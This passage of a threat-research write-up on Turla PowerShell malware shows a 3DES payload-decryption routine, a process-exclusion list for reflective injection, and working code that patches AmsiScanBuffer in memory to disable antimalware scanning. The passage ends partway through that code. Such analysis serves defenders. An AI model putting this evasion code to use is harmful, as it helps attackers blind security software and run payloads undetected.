					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-2">2</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-4">4</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-6">6</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-8">8</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-10">10</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-12">12</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-14">14</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e575273604298-16">16</div><div class="crayon-num" data-line="crayon-60a99b2e3e575273604298-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a99b2e3e575273604298-1"><span class="crayon-sy">$</span><span class="crayon-v">GSP540cd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;base64 encoded + encrypted payload&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-2"><span class="crayon-sy">$</span><span class="crayon-v">RS99ggf</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">XZ228hha</span><span class="crayon-sy">.</span><span class="crayon-e">GetBytes</span><span class="crayon-sy">(</span><span class="crayon-s">"PINGQXOMQFTZGDZX"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-3"><span class="crayon-sy">$</span><span class="crayon-v">STD33abh</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">GSP540cd</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-4"><span class="crayon-sy">$</span><span class="crayon-v">SB49gje</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Security</span><span class="crayon-sy">.</span><span class="crayon-v">Cryptography</span><span class="crayon-sy">.</span><span class="crayon-e">PasswordDeriveBytes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">IY51aab</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">XZ228hha</span><span class="crayon-sy">.</span><span class="crayon-e">GetBytes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">CBI61aeb</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"SHA1"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-5"><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">XYW18ja</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">SB49gje</span><span class="crayon-sy">.</span><span class="crayon-e">GetBytes</span><span class="crayon-sy">(</span><span class="crayon-cn">16</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-6"><span class="crayon-sy">$</span><span class="crayon-v">EN594ca</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Security</span><span class="crayon-sy">.</span><span class="crayon-v">Cryptography</span><span class="crayon-sy">.</span><span class="crayon-v">TripleDESCryptoServiceProvider</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-7"><span class="crayon-sy">$</span><span class="crayon-v">EN594ca</span><span class="crayon-sy">.</span><span class="crayon-v">Mode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Security</span><span class="crayon-sy">.</span><span class="crayon-v">Cryptography</span><span class="crayon-sy">.</span><span class="crayon-v">CipherMode</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">CBC</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-8"><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">ID796ea</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">STD33abh</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-9"><span class="crayon-sy">$</span><span class="crayon-v">ZQD772bf</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">EN594ca</span><span class="crayon-sy">.</span><span class="crayon-e">CreateDecryptor</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">XYW18ja</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">RS99ggf</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-10"><span class="crayon-sy">$</span><span class="crayon-v">DCR12ffg</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">IO</span><span class="crayon-sy">.</span><span class="crayon-e">MemoryStream</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">STD33abh</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-t">True</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-11"><span class="crayon-sy">$</span><span class="crayon-v">WG731ff</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Security</span><span class="crayon-sy">.</span><span class="crayon-v">Cryptography</span><span class="crayon-sy">.</span><span class="crayon-e">CryptoStream</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DCR12ffg</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ZQD772bf</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Security</span><span class="crayon-sy">.</span><span class="crayon-v">Cryptography</span><span class="crayon-sy">.</span><span class="crayon-v">CryptoStreamMode</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Read</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-12"><span class="crayon-sy">$</span><span class="crayon-v">XBD387bb</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">WG731ff</span><span class="crayon-sy">.</span><span class="crayon-e">Read</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ID796ea</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ID796ea</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-13"><span class="crayon-sy">$</span><span class="crayon-v">OQ09hd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">YR300hf</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">IWM01jdg</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ID796ea</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-14"><span class="crayon-sy">$</span><span class="crayon-v">DCR12ffg</span><span class="crayon-sy">.</span><span class="crayon-e">Close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-15"><span class="crayon-sy">$</span><span class="crayon-v">WG731ff</span><span class="crayon-sy">.</span><span class="crayon-e">Close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e575273604298-16"><span class="crayon-sy">$</span><span class="crayon-v">EN594ca</span><span class="crayon-sy">.</span><span class="crayon-e">Clear</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e575273604298-17"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">XZ228hha</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">OQ09hd</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">OQ09hd</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0064 seconds] -->
<p><em>Figure 4. Decryption routine</em></p>
<p>The payload is decrypted using the <a href="https://en.wikipedia.org/wiki/Triple_DES" target="_blank" rel="noopener">3DES</a> algorithm. The Initialization Vector, <span style="font-family: courier new, courier, monospace;">PINGQXOMQFTZGDZX</span> in this example, is different for each sample. The key and the salt are also different for each script and are not stored in the script, but only in the WMI filter or in the <span style="font-family: courier new, courier, monospace;">profile.ps1</span> file.</p>
<h2>PE loader</h2>
<p>The payload decrypted at the previous step is a PowerShell reflective loader. It is based on the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">Invoke-ReflectivePEInjection.ps1</a> from the same PowerSploit framework. The executable is hardcoded in the script and is loaded directly into the memory of a randomly chosen process that is already running on the system.</p>
<p>In some samples, the attackers specify a list of executables that the binary should not be injected into, as shown in Figure 5.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a99b2e3e577746746580" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$IgnoreNames = @("smss.exe","csrss.exe","wininit.exe","winlogon.exe","lsass.exe","lsm.exe","svchost.exe","avp.exe","avpsus.exe","klnagent.exe","vapm.exe","spoolsv.exe");</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a99b2e3e577746746580-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a99b2e3e577746746580-1"><span class="crayon-sy">$</span><span class="crayon-v">IgnoreNames</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">(</span><span class="crayon-s">"smss.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"csrss.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"wininit.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"winlogon.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"lsass.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"lsm.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"svchost.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"avp.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"avpsus.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"klnagent.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"vapm.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">"spoolsv.exe"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><em>Figure 5. Example list of excluded processes</em></p>
<p>It is interesting to note that the names<span style="font-family: courier new, courier, monospace;"> avp.exe</span>, <span style="font-family: courier new, courier, monospace;">avpsus.exe</span>, <span style="font-family: courier new, courier, monospace;">klnagent.exe</span> and <span style="font-family: courier new, courier, monospace;">vapm.exe</span> refer to Kaspersky Labs executables. It seems that Turla operators really want to avoid injecting their malware into Kaspersky software.</p>
<h3>AMSI bypass</h3>
<p>In some samples deployed since March 2019, Turla developers modified their PowerShell scripts in order to bypass the <a href="https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal" target="_blank" rel="noopener">Antimalware Scan Interface (AMSI)</a>. This is an interface allowing any Windows application to integrate with the installed antimalware product. It is particularly useful for PowerShell and macros.</p>
<p>They did not find a new bypass but re-used a technique presented at Black Hat Asia 2018 in the talk <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf" target="_blank" rel="noopener">The Rise and Fall of AMSI</a>. It consists of the in-memory patching of the beginning of the function <span style="font-family: courier new, courier, monospace;">AmsiScanBuffer</span> in the library <span style="font-family: courier new, courier, monospace;">amsi.dll</span>.</p>
<p>The PowerShell script loads a .NET executable to retrieve the address of <span style="font-family: courier new, courier, monospace;">AmsiScanBuffer</span>. Then, it calls <span style="font-family: courier new, courier, monospace;">VirtualProtect</span> to allow writing at the retrieved address.</p>
<p>Finally, the patching is done directly in the PowerShell script as shown in Figure 6. It modifies the beginning of <span style="font-family: courier new, courier, monospace;">AmsiScanBuffer</span> to always return 1 (<span style="font-family: courier new, courier, monospace;">AMSI_RESULT_NOT_DETECTED</span>). Thus, the antimalware product will not receive the buffer, which prevents any scanning.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a99b2e3e579066373595" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ptr = [Win32]::FindAmsiFun();
if($ptr -eq 0)
{
	Write-Host "protection not found"
}
else
{
	if([IntPtr]::size -eq 4)
	{
		Write-Host "x32 protection detected"
		$buf = New-Object Byte[] 7
		$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00; #mov ax, 1 ;ret 0x18;
		$c = [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)
	}
	else
	{
		Write-Host "x64 protection detected"
		$buf = New-Object Byte[] 6
		$buf[0] = 0xb8; $buf[1] = 0x01; $buf[2] = 0x00; $buf[3] = 0x00; $buf[4] = 0x00; $buf[5] = 0xc3;  #mov eax, 1 ;ret;
		$c = [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 6)
	}

}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-2">2</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-4">4</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-6">6</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-8">8</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-10">10</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-12">12</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-14">14</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-16">16</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-18">18</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-20">20</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e579066373595-22">22</div><div class="crayon-num" data-line="crayon-60a99b2e3e579066373595-23">23</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a99b2e3e579066373595-1"><span class="crayon-sy">$</span><span class="crayon-v">ptr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Win32</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FindAmsiFun</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-2"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ptr</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-3"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-4"><span class="crayon-h">	</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Host</span><span class="crayon-h"> </span><span class="crayon-s">"protection not found"</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-5"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-6"><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-7"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-8"><span class="crayon-h">	</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">IntPtr</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">size</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-9"><span class="crayon-h">	</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-10"><span class="crayon-h">		</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Host</span><span class="crayon-h"> </span><span class="crayon-s">"x32 protection detected"</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-11"><span class="crayon-h">		</span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">7</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-12"><span class="crayon-h">		</span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x66</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0xb8</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x01</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x00</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0xc2</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">5</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x18</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">6</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x00</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-p">#mov ax, 1 ;ret 0x18;</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-13"><span class="crayon-h">		</span><span class="crayon-sy">$</span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Runtime</span><span class="crayon-sy">.</span><span class="crayon-v">InteropServices</span><span class="crayon-sy">.</span><span class="crayon-v">Marshal</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">Copy</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ptr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-14"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-15"><span class="crayon-h">	</span><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-16"><span class="crayon-h">	</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-17"><span class="crayon-h">		</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Host</span><span class="crayon-h"> </span><span class="crayon-s">"x64 protection detected"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-18"><span class="crayon-h">		</span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-19"><span class="crayon-h">		</span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0xb8</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span 